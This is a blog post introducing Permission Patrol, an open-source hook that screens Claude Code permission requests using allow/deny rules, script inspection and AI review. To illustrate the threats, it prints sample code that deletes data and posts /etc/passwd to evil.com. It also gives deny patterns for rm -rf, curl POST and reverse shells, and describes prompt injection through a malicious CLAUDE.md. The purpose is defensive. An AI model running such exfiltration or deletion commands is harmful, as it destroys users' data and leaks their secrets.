<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Permission Patrol: An AI Security Guard for Claude Code | stillcuriouscat</title>
<meta name=keywords content="claude code security,claude code dangerously-skip-permissions,claude code hooks,claude code command hook,claude code permission guard,ai agent security,claude code safe mode,claude code script inspection,prompt injection prevention,defense in depth ai,claude code permission request hook,how to secure claude code"><meta name=description content="Stop using --dangerously-skip-permissions. Permission Patrol is an open-source command hook that reads script content before Claude Code executes it — catching hidden rm -rf, data exfiltration, and prompt injection that prompt hooks can't see."><meta name=author content="stillcuriouscat"><link rel=canonical href=https://stillcuriouscat.github.io/posts/permission-patrol-ai-security-guard-for-claude-code/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://stillcuriouscat.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://stillcuriouscat.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://stillcuriouscat.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://stillcuriouscat.github.io/apple-touch-icon.png><link rel=mask-icon href=https://stillcuriouscat.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://stillcuriouscat.github.io/posts/permission-patrol-ai-security-guard-for-claude-code/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://stillcuriouscat.github.io/posts/permission-patrol-ai-security-guard-for-claude-code/"><meta property="og:site_name" content="stillcuriouscat"><meta property="og:title" content="Permission Patrol: An AI Security Guard for Claude Code"><meta property="og:description" content="Stop using --dangerously-skip-permissions. Permission Patrol is an open-source command hook that reads script content before Claude Code executes it — catching hidden rm -rf, data exfiltration, and prompt injection that prompt hooks can't see."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-02-06T00:00:00+00:00"><meta property="article:modified_time" content="2026-02-06T00:00:00+00:00"><meta property="article:tag" content="Claude-Code"><meta property="article:tag" content="Ai-Security"><meta property="article:tag" content="Hooks"><meta property="article:tag" content="Command-Hook"><meta property="article:tag" content="Python"><meta property="article:tag" content="Open-Source"><meta name=twitter:card content="summary"><meta name=twitter:title content="Permission Patrol: An AI Security Guard for Claude Code"><meta name=twitter:description content="Stop using --dangerously-skip-permissions. Permission Patrol is an open-source command hook that reads script content before Claude Code executes it — catching hidden rm -rf, data exfiltration, and prompt injection that prompt hooks can't see."><meta name=twitter:site content="@stillcurio3982"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://stillcuriouscat.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Permission Patrol: An AI Security Guard for Claude Code","item":"https://stillcuriouscat.github.io/posts/permission-patrol-ai-security-guard-for-claude-code/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Permission Patrol: An AI Security Guard for Claude Code","name":"Permission Patrol: An AI Security Guard for Claude Code","description":"Stop using --dangerously-skip-permissions. Permission Patrol is an open-source command hook that reads script content before Claude Code executes it — catching hidden rm -rf, data exfiltration, and prompt injection that prompt hooks can't see.","keywords":["claude code security","claude code dangerously-skip-permissions","claude code hooks","claude code command hook","claude code permission guard","ai agent security","claude code safe mode","claude code script inspection","prompt injection prevention","defense in depth ai","claude code permission request hook","how to secure claude code"],"articleBody":"Why --dangerously-skip-permissions Is Dangerous Many developers run Claude Code with --dangerously-skip-permissions to avoid the constant permission prompts. It’s tempting — no interruptions, fully autonomous coding. But you’re giving an AI agent unrestricted access to your filesystem, network, and shell.\nHere’s what can go wrong:\nAccidental file deletion. Claude might run rm -rf on the wrong directory, or a script it generates calls shutil.rmtree() on a path outside your project. With no permission check, it just happens. Prompt injection. A malicious CLAUDE.md or a crafted file in a cloned repo can instruct Claude to exfiltrate your SSH keys, .env files, or source code. With --dangerously-skip-permissions, there’s nothing stopping it. Unreviewed scripts. Claude generates and runs Python/Node/Bash scripts all the time. Without permission checks, you never see what’s inside — even if the script contains requests.post(\"https://evil.com\", data=secrets). The manual alternative isn’t great either. Clicking “Allow” on every permission prompt means you’re reviewing hundreds of requests per session. Most people stop reading after the first few — which means long bash chains and innocent-looking script names slip through without real scrutiny.\nPermission Patrol is the middle ground. It auto-allows safe operations (zero latency), auto-denies known-dangerous patterns (zero cost), and uses AI review only for the ambiguous cases that actually need human-level judgment. You get security without the friction.\nThe Problem: Claude Code Runs Scripts Blindly Claude Code is an incredible tool for software development. It can write code, run tests, manage git, and execute scripts — all autonomously. But that power comes with a risk.\nWhen Claude Code asks permission to run python3 script.py, you see the command string. You click “Allow.” But what’s actually inside that script?\n# script.py - looks innocent as a command import shutil shutil.rmtree(\"/home/user/important_data\") # Hidden danger This is the gap I wanted to close. And it’s not just scripts — there’s another class of commands that’s equally dangerous.\nScenario 1: Long Chained Commands Nobody Has Time to Review Claude Code often generates long, chained bash commands. When you see something like this in the permission prompt, do you really read every part?\ncd /tmp \u0026\u0026 git clone https://github.com/some/repo.git \u0026\u0026 cd repo \\ \u0026\u0026 pip install -r requirements.txt \u0026\u0026 python3 setup.py build \\ \u0026\u0026 cp -r dist/* /usr/local/lib/ \u0026\u0026 chmod -R 755 /usr/local/lib/project \\ \u0026\u0026 systemctl restart app \\ \u0026\u0026 curl -X POST https://hooks.slack.com/services/T00/B00/xxx -d '{\"text\":\"deployed\"}' \\ \u0026\u0026 rm -rf /tmp/repo Did you spot the curl -X POST exfiltrating data to an external webhook? Or the rm -rf buried at the very end? In a wall of \u0026\u0026-chained commands, dangerous operations hide in plain sight. Permission Patrol’s regex engine catches both automatically — no AI call needed.\nScenario 2: Innocent Script Hiding Dangerous Code This is the more subtle problem. The command looks completely harmless:\npython3 scripts/cleanup_cache.py But cleanup_cache.py might contain:\nimport shutil, requests shutil.rmtree(\"/home/user/important_data\") requests.post(\"https://evil.com/exfil\", data=open(\"/etc/passwd\").read()) A standard permission hook only sees the command string python3 scripts/cleanup_cache.py — it has no idea what’s inside the file. Permission Patrol reads the script content (up to 5KB) and sends it to Claude for AI security review.\nWhy Prompt Hooks Fall Short Claude Code supports hooks — custom logic that runs when permission is requested. There are two types:\nPrompt hooks (type: \"prompt\"): An LLM reviews the request. Simple to set up, but it only sees the command string. It sees python3 script.py, not what’s inside the file. Command hooks (type: \"command\"): A script runs to make the decision. It can do anything — including reading the file content. A prompt hook would happily approve python3 script.py because the command looks harmless. It has no way to know the script deletes your data.\nThe Solution: Permission Patrol Permission Patrol is a command hook that adds a multi-layer security review:\nR e q u e s t a s ( s ( N r e r e g e r t m t i i i t t t t v i - i h e n r n s e D S S O s g f g t r a c e t s , s a ? n r n h . . t g i s e j c j u e p i r s u s s r t t o r o , o i c n l n u e v a l p s x e s d P a s e e e e O l , r r c / s n S l m e u ? y T o R i g t o ? , w e s e i u ? a s x o t s d i ? n s c , o ? i p n d C , r - e l R u g a e g P f u p u j h a f a D r d e s , r e R o e c r s d n e j t e g . y a e r p ( h p d c e ( o n . y i t v n o . m f ? i o d . h m i e e A ) o e l w A l P o d e s P e I k i , I t a t e c t C C h c . a e l l e a . l l a a l . l y u u r l ) ) d d e ) e e q u r r e e e s v v t i i e e w w s s , c o u n s t e e r n t d e c i d e s How the Hook Receives Requests Claude Code sends a JSON object to the hook’s stdin via the PermissionRequest event. The hook reads tool_name, tool_input, and cwd to understand what Claude wants to do:\n# Claude Code pipes this JSON to the hook's stdin request = json.load(sys.stdin) tool_name = request.get(\"tool_name\", \"\") # e.g. \"Bash\", \"Write\", \"WebFetch\" tool_input = request.get(\"tool_input\", {}) # e.g. {\"command\": \"python3 script.py\"} cwd = request.get(\"cwd\", \"\") # working directory How the Hook Returns Decisions The hook communicates back to Claude Code by printing JSON to stdout. Three possible decisions:\n# Allow — Claude Code proceeds without prompting the user def allow(): print(json.dumps({ \"hookSpecificOutput\": { \"hookEventName\": \"PermissionRequest\", \"decision\": {\"behavior\": \"allow\"} } })) sys.exit(0) # Deny — Claude Code blocks the action with a reason def deny(reason: str): print(json.dumps({ \"hookSpecificOutput\": { \"hookEventName\": \"PermissionRequest\", \"decision\": {\"behavior\": \"deny\", \"message\": reason} } })) sys.exit(0) # Ask user — exit 0 with NO JSON output # Claude Code falls back to showing the standard permission dialog def ask_user(): sys.exit(0) # no output = let user decide Deterministic Rules (Zero Cost) Common operations are handled by settings.json allow/deny rules — no API call, no latency:\nDeny: rm -rf, shred, curl POST, scp, gh repo delete Allow: git status, ls, Read, ruff, mypy, eslint, trusted domains The hook also has its own regex layer for patterns that slip past settings.json (e.g., rm /home/..., dd of=/dev/, reverse shell patterns).\nScript Content Inspection (The Key Feature) When you run python3 script.py, pytest, or node app.js, the hook:\nDetects the script execution pattern Reads the actual file content (up to 5KB) Sends both the command and script content to Claude for review Claude checks for dangerous patterns: shutil.rmtree, os.remove, requests.post, code injection, etc. Returns allow/deny/ask based on the analysis Here’s how the script content is injected into the review prompt — this is the part prompt hooks simply cannot do:\n# Detect script execution and read the file script_match = re.search( r'\\b(python|python3|node|bash|sh)\\s+([^\\s;|\u0026]+)', command ) if script_match: script_path = script_match.group(2) with open(script_full_path, \"r\") as f: script_content = f.read()[:5000] # read up to 5KB # Build the review prompt with script content included prompt = f\"\"\"You are a security reviewer for Claude Code. ## Request Information - Tool: {tool_name} - Parameters: {json.dumps(tool_input)} ## Script Content ``` {script_content} ``` ## Response Format (pure JSON) {{\"decision\": \"allow\"}} or {{\"decision\": \"deny\", \"reason\": \"...\"}} or {{\"decision\": \"ask\", \"reason\": \"...\"}} \"\"\" Calling Claude CLI (No API Key Required) The hook calls Claude CLI in print mode, which uses your existing Claude Code subscription — no separate API key needed:\nresult = subprocess.run( [\"claude\", \"-p\", prompt, \"--model\", \"opus\", \"--output-format\", \"text\"], capture_output=True, text=True, timeout=30 ) parsed = json.loads(result.stdout.strip()) decision = parsed[\"decision\"] # \"allow\", \"deny\", or \"ask\" Path-Aware Decisions Even when Claude approves, the hook adds extra safety based on path classification:\nInside project directory: Claude can auto-approve Outside project / sensitive paths (~/.ssh, /etc/, .env): User always has the final say — Claude’s verdict is advisory only Desktop notification on Linux so you know Claude already reviewed it No API Key Required Permission Patrol calls Claude CLI internally, which uses your Claude Code subscription quota. No separate API key, no extra cost setup. Just install and go.\nGetting Started 1. Clone the repo git clone https://github.com/stillcuriouscat/permission-patrol.git 2. Merge permissions into your settings Add the allow/deny rules from permissions.json to your ~/.claude/settings.json:\n{ \"permissions\": { \"allow\": [ \"Bash(git *)\", \"Bash(gh *)\", \"WebFetch(domain:github.com)\" ], \"deny\": [ \"Bash(rm -rf *)\", \"Bash(gh repo delete *)\" ] } } 3. Add the hook { \"hooks\": { \"PermissionRequest\": [ { \"matcher\": \"*\", \"hooks\": [ { \"type\": \"command\", \"command\": \"python3 /path/to/permission-patrol/permission-guard.py\", \"timeout\": 30000 } ] } ] } } 4. Restart Claude Code That’s it. Permission Patrol is now guarding your sessions.\nWhat I Learned Building This Command hooks are underrated. Most examples use prompt hooks, but command hooks can do so much more — read files, check network state, verify git status.\nDeterministic rules first, AI second. Using settings.json rules for common patterns means zero latency and zero cost for 90% of operations. AI review is reserved for the ambiguous cases.\nDefense in depth. No single check is perfect. Combining regex patterns, file content inspection, path checks, and AI review creates multiple layers of security.\nFrequently Asked Questions Does Permission Patrol work with --dangerously-skip-permissions? No — and that’s the point. --dangerously-skip-permissions disables all permission checks, including hooks. Permission Patrol is designed for normal mode, where it replaces the manual “Allow/Deny” workflow with automated, intelligent review. You get the speed of skip-permissions with the safety of human review.\nHow is a command hook different from a prompt hook? A prompt hook asks an LLM to review the command string (e.g., python3 script.py). A command hook runs a script that can do anything — including reading the actual file content before execution. Permission Patrol uses a command hook so it can inspect what’s inside scripts, not just the command name.\nDoes it require a separate API key? No. Permission Patrol calls claude CLI internally, which uses your existing Claude Code subscription. No extra API key, no additional cost.\nWhat dangerous patterns does it catch? Permission Patrol catches patterns in two layers:\nRegex (instant, no AI): rm -rf, shred, curl POST, scp, wget, chmod 777, data exfiltration commands AI review (Claude): shutil.rmtree(), os.remove(), requests.post(), obfuscated code, file system access outside the project, code injection patterns Does it slow down Claude Code? Deterministic allow/deny rules add near-zero latency. AI review takes a few seconds via Claude CLI — only triggered for ambiguous cases like script execution or sensitive paths. In practice, 90%+ of operations are handled by deterministic rules instantly.\nCan I customize the allow/deny rules? Yes. Edit the permissions section in your ~/.claude/settings.json. Add patterns to allow for commands you trust, or deny for commands you want blocked. The rules use glob patterns like Bash(git *) or Bash(rm -rf *).\nLinks GitHub: stillcuriouscat/permission-patrol Claude Code Hooks Docs: docs.anthropic.com License: MIT — use it, fork it, improve it. If you’re using Claude Code for development, give Permission Patrol a try. And if you find a dangerous pattern it doesn’t catch, open an issue — security is a community effort.\n","wordCount":"1979","inLanguage":"en","datePublished":"2026-02-06T00:00:00Z","dateModified":"2026-02-06T00:00:00Z","author":{"@type":"Person","name":"stillcuriouscat"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://stillcuriouscat.github.io/posts/permission-patrol-ai-security-guard-for-claude-code/"},"publisher":{"@type":"Organization","name":"stillcuriouscat","logo":{"@type":"ImageObject","url":"https://stillcuriouscat.github.io/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://stillcuriouscat.github.io/ accesskey=h title="stillcuriouscat (Alt + H)">stillcuriouscat</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://stillcuriouscat.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://stillcuriouscat.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Permission Patrol: An AI Security Guard for Claude Code</h1><div class=post-description>Stop using --dangerously-skip-permissions. Permission Patrol is an open-source command hook that reads script content before Claude Code executes it — catching hidden rm -rf, data exfiltration, and prompt injection that prompt hooks can't see.</div><div class=post-meta><span title='2026-02-06 00:00:00 +0000 UTC'>February 6, 2026</span>&nbsp;·&nbsp;<span>10 min</span>&nbsp;·&nbsp;<span>stillcuriouscat</span></div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#why---dangerously-skip-permissions-is-dangerous aria-label="Why --dangerously-skip-permissions Is Dangerous">Why --dangerously-skip-permissions Is Dangerous</a></li><li><a href=#the-problem-claude-code-runs-scripts-blindly aria-label="The Problem: Claude Code Runs Scripts Blindly">The Problem: Claude Code Runs Scripts Blindly</a><ul><li><a href=#scenario-1-long-chained-commands-nobody-has-time-to-review aria-label="Scenario 1: Long Chained Commands Nobody Has Time to Review">Scenario 1: Long Chained Commands Nobody Has Time to Review</a></li><li><a href=#scenario-2-innocent-script-hiding-dangerous-code aria-label="Scenario 2: Innocent Script Hiding Dangerous Code">Scenario 2: Innocent Script Hiding Dangerous Code</a></li></ul></li><li><a href=#why-prompt-hooks-fall-short aria-label="Why Prompt Hooks Fall Short">Why Prompt Hooks Fall Short</a></li><li><a href=#the-solution-permission-patrol aria-label="The Solution: Permission Patrol">The Solution: Permission Patrol</a><ul><li><a href=#how-the-hook-receives-requests aria-label="How the Hook Receives Requests">How the Hook Receives Requests</a></li><li><a href=#how-the-hook-returns-decisions aria-label="How the Hook Returns Decisions">How the Hook Returns Decisions</a></li><li><a href=#deterministic-rules-zero-cost aria-label="Deterministic Rules (Zero Cost)">Deterministic Rules (Zero Cost)</a></li><li><a href=#script-content-inspection-the-key-feature aria-label="Script Content Inspection (The Key Feature)">Script Content Inspection (The Key Feature)</a></li><li><a href=#calling-claude-cli-no-api-key-required aria-label="Calling Claude CLI (No API Key Required)">Calling Claude CLI (No API Key Required)</a></li><li><a href=#path-aware-decisions aria-label="Path-Aware Decisions">Path-Aware Decisions</a></li></ul></li><li><a href=#no-api-key-required aria-label="No API Key Required">No API Key Required</a></li><li><a href=#getting-started aria-label="Getting Started">Getting Started</a><ul><li><a href=#1-clone-the-repo aria-label="1. Clone the repo">1. Clone the repo</a></li><li><a href=#2-merge-permissions-into-your-settings aria-label="2. Merge permissions into your settings">2. Merge permissions into your settings</a></li><li><a href=#3-add-the-hook aria-label="3. Add the hook">3. Add the hook</a></li><li><a href=#4-restart-claude-code aria-label="4. Restart Claude Code">4. Restart Claude Code</a></li></ul></li><li><a href=#what-i-learned-building-this aria-label="What I Learned Building This">What I Learned Building This</a></li><li><a href=#frequently-asked-questions aria-label="Frequently Asked Questions">Frequently Asked Questions</a><ul><li><a href=#does-permission-patrol-work-with---dangerously-skip-permissions aria-label="Does Permission Patrol work with --dangerously-skip-permissions?">Does Permission Patrol work with --dangerously-skip-permissions?</a></li><li><a href=#how-is-a-command-hook-different-from-a-prompt-hook aria-label="How is a command hook different from a prompt hook?">How is a command hook different from a prompt hook?</a></li><li><a href=#does-it-require-a-separate-api-key aria-label="Does it require a separate API key?">Does it require a separate API key?</a></li><li><a href=#what-dangerous-patterns-does-it-catch aria-label="What dangerous patterns does it catch?">What dangerous patterns does it catch?</a></li><li><a href=#does-it-slow-down-claude-code aria-label="Does it slow down Claude Code?">Does it slow down Claude Code?</a></li><li><a href=#can-i-customize-the-allowdeny-rules aria-label="Can I customize the allow/deny rules?">Can I customize the allow/deny rules?</a></li></ul></li><li><a href=#links aria-label=Links>Links</a></li></ul></div></details></div><div class=post-content><h2 id=why---dangerously-skip-permissions-is-dangerous>Why <code>--dangerously-skip-permissions</code> Is Dangerous<a hidden class=anchor aria-hidden=true href=#why---dangerously-skip-permissions-is-dangerous>#</a></h2><p>Many developers run Claude Code with <code>--dangerously-skip-permissions</code> to avoid the constant permission prompts. It&rsquo;s tempting — no interruptions, fully autonomous coding. But you&rsquo;re giving an AI agent <strong>unrestricted access</strong> to your filesystem, network, and shell.</p><p>Here&rsquo;s what can go wrong:</p><ul><li><strong>Accidental file deletion.</strong> Claude might run <code>rm -rf</code> on the wrong directory, or a script it generates calls <code>shutil.rmtree()</code> on a path outside your project. With no permission check, it just happens.</li><li><strong>Prompt injection.</strong> A malicious <code>CLAUDE.md</code> or a crafted file in a cloned repo can instruct Claude to exfiltrate your SSH keys, <code>.env</code> files, or source code. With <code>--dangerously-skip-permissions</code>, there&rsquo;s nothing stopping it.</li><li><strong>Unreviewed scripts.</strong> Claude generates and runs Python/Node/Bash scripts all the time. Without permission checks, you never see what&rsquo;s inside — even if the script contains <code>requests.post("https://evil.com", data=secrets)</code>.</li></ul><p>The manual alternative isn&rsquo;t great either. Clicking &ldquo;Allow&rdquo; on every permission prompt means you&rsquo;re reviewing hundreds of requests per session. Most people stop reading after the first few — which means <strong>long bash chains</strong> and <strong>innocent-looking script names</strong> slip through without real scrutiny.</p><p><strong>Permission Patrol is the middle ground.</strong> It auto-allows safe operations (zero latency), auto-denies known-dangerous patterns (zero cost), and uses AI review only for the ambiguous cases that actually need human-level judgment. You get security without the friction.</p><h2 id=the-problem-claude-code-runs-scripts-blindly>The Problem: Claude Code Runs Scripts Blindly<a hidden class=anchor aria-hidden=true href=#the-problem-claude-code-runs-scripts-blindly>#</a></h2><p><a href=https://docs.anthropic.com/en/docs/claude-code>Claude Code</a> is an incredible tool for software development. It can write code, run tests, manage git, and execute scripts — all autonomously. But that power comes with a risk.</p><p>When Claude Code asks permission to run <code>python3 script.py</code>, you see the command string. You click &ldquo;Allow.&rdquo; But what&rsquo;s actually inside that script?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># script.py - looks innocent as a command</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> shutil
</span></span><span style=display:flex><span>shutil<span style=color:#f92672>.</span>rmtree(<span style=color:#e6db74>&#34;/home/user/important_data&#34;</span>)  <span style=color:#75715e># Hidden danger</span>
</span></span></code></pre></div><p>This is the gap I wanted to close. And it&rsquo;s not just scripts — there&rsquo;s another class of commands that&rsquo;s equally dangerous.</p><h3 id=scenario-1-long-chained-commands-nobody-has-time-to-review>Scenario 1: Long Chained Commands Nobody Has Time to Review<a hidden class=anchor aria-hidden=true href=#scenario-1-long-chained-commands-nobody-has-time-to-review>#</a></h3><p>Claude Code often generates long, chained bash commands. When you see something like this in the permission prompt, do you really read every part?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cd /tmp <span style=color:#f92672>&amp;&amp;</span> git clone https://github.com/some/repo.git <span style=color:#f92672>&amp;&amp;</span> cd repo <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  <span style=color:#f92672>&amp;&amp;</span> pip install -r requirements.txt <span style=color:#f92672>&amp;&amp;</span> python3 setup.py build <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  <span style=color:#f92672>&amp;&amp;</span> cp -r dist/* /usr/local/lib/ <span style=color:#f92672>&amp;&amp;</span> chmod -R <span style=color:#ae81ff>755</span> /usr/local/lib/project <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  <span style=color:#f92672>&amp;&amp;</span> systemctl restart app <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  <span style=color:#f92672>&amp;&amp;</span> curl -X POST https://hooks.slack.com/services/T00/B00/xxx -d <span style=color:#e6db74>&#39;{&#34;text&#34;:&#34;deployed&#34;}&#39;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  <span style=color:#f92672>&amp;&amp;</span> rm -rf /tmp/repo
</span></span></code></pre></div><p>Did you spot the <code>curl -X POST</code> exfiltrating data to an external webhook? Or the <code>rm -rf</code> buried at the very end? In a wall of <code>&&</code>-chained commands, dangerous operations hide in plain sight. Permission Patrol&rsquo;s regex engine catches both automatically — no AI call needed.</p><h3 id=scenario-2-innocent-script-hiding-dangerous-code>Scenario 2: Innocent Script Hiding Dangerous Code<a hidden class=anchor aria-hidden=true href=#scenario-2-innocent-script-hiding-dangerous-code>#</a></h3><p>This is the more subtle problem. The command looks completely harmless:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 scripts/cleanup_cache.py
</span></span></code></pre></div><p>But <code>cleanup_cache.py</code> might contain:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> shutil<span style=color:#f92672>,</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>shutil<span style=color:#f92672>.</span>rmtree(<span style=color:#e6db74>&#34;/home/user/important_data&#34;</span>)
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#34;https://evil.com/exfil&#34;</span>, data<span style=color:#f92672>=</span>open(<span style=color:#e6db74>&#34;/etc/passwd&#34;</span>)<span style=color:#f92672>.</span>read())
</span></span></code></pre></div><p>A standard permission hook only sees the command string <code>python3 scripts/cleanup_cache.py</code> — it has <strong>no idea</strong> what&rsquo;s inside the file. Permission Patrol reads the script content (up to 5KB) and sends it to Claude for AI security review.</p><h2 id=why-prompt-hooks-fall-short>Why Prompt Hooks Fall Short<a hidden class=anchor aria-hidden=true href=#why-prompt-hooks-fall-short>#</a></h2><p>Claude Code supports <a href=https://docs.anthropic.com/en/docs/claude-code/hooks>hooks</a> — custom logic that runs when permission is requested. There are two types:</p><ul><li><strong>Prompt hooks</strong> (<code>type: "prompt"</code>): An LLM reviews the request. Simple to set up, but it <strong>only sees the command string</strong>. It sees <code>python3 script.py</code>, not what&rsquo;s inside the file.</li><li><strong>Command hooks</strong> (<code>type: "command"</code>): A script runs to make the decision. It can do anything — including <strong>reading the file content</strong>.</li></ul><p>A prompt hook would happily approve <code>python3 script.py</code> because the command looks harmless. It has no way to know the script deletes your data.</p><h2 id=the-solution-permission-patrol>The Solution: Permission Patrol<a hidden class=anchor aria-hidden=true href=#the-solution-permission-patrol>#</a></h2><p><a href=https://github.com/stillcuriouscat/permission-patrol>Permission Patrol</a> is a command hook that adds a multi-layer security review:</p><div class="goat svg-container"><svg font-family="Menlo,Lucida Console,monospace" viewBox="0 0 600 281"><g transform="translate(8,16)"><path d="M32 32H48" fill="none" stroke="currentcolor"/><path d="M224 32h16" fill="none" stroke="currentcolor"/><path d="M32 80H48" fill="none" stroke="currentcolor"/><path d="M232 80h16" fill="none" stroke="currentcolor"/><path d="M32 128H48" fill="none" stroke="currentcolor"/><path d="M136 128h16" fill="none" stroke="currentcolor"/><path d="M72 160H88" fill="none" stroke="currentcolor"/><path d="M240 160h16" fill="none" stroke="currentcolor"/><path d="M72 192H88" fill="none" stroke="currentcolor"/><path d="M248 192h16" fill="none" stroke="currentcolor"/><path d="M72 224H88" fill="none" stroke="currentcolor"/><path d="M336 224h16" fill="none" stroke="currentcolor"/><path d="M72 256H88" fill="none" stroke="currentcolor"/><path d="M208 256h16" fill="none" stroke="currentcolor"/><path d="M32 16V32" fill="none" stroke="currentcolor"/><path d="M32 32V80" fill="none" stroke="currentcolor"/><path d="M32 80v48" fill="none" stroke="currentcolor"/><path d="M72 144v16" fill="none" stroke="currentcolor"/><path d="M72 160v32" fill="none" stroke="currentcolor"/><path d="M72 192v32" fill="none" stroke="currentcolor"/><path d="M72 224v32" fill="none" stroke="currentcolor"/><polygon points="160.000000,128.000000 148.000000,122.400002 148.000000,133.600006" fill="currentcolor" transform="rotate(0.000000, 152.000000, 128.000000)"/><polygon points="232.000000,256.000000 220.000000,250.399994 220.000000,261.600006" fill="currentcolor" transform="rotate(0.000000, 224.000000, 256.000000)"/><polygon points="248.000000,32.000000 236.000000,26.400000 236.000000,37.599998" fill="currentcolor" transform="rotate(0.000000, 240.000000, 32.000000)"/><polygon points="256.000000,80.000000 244.000000,74.400002 244.000000,85.599998" fill="currentcolor" transform="rotate(0.000000, 248.000000, 80.000000)"/><polygon points="264.000000,160.000000 252.000000,154.399994 252.000000,165.600006" fill="currentcolor" transform="rotate(0.000000, 256.000000, 160.000000)"/><polygon points="272.000000,192.000000 260.000000,186.399994 260.000000,197.600006" fill="currentcolor" transform="rotate(0.000000, 264.000000, 192.000000)"/><polygon points="360.000000,224.000000 348.000000,218.399994 348.000000,229.600006" fill="currentcolor" transform="rotate(0.000000, 352.000000, 224.000000)"/><text text-anchor="middle" x="0" y="4" fill="currentcolor" style="font-size:1em">R</text><text text-anchor="middle" x="8" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="16" y="4" fill="currentcolor" style="font-size:1em">q</text><text text-anchor="middle" x="24" y="4" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="32" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="40" y="4" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="48" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="64" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="64" y="36" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="64" y="52" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="64" y="84" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="64" y="100" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" 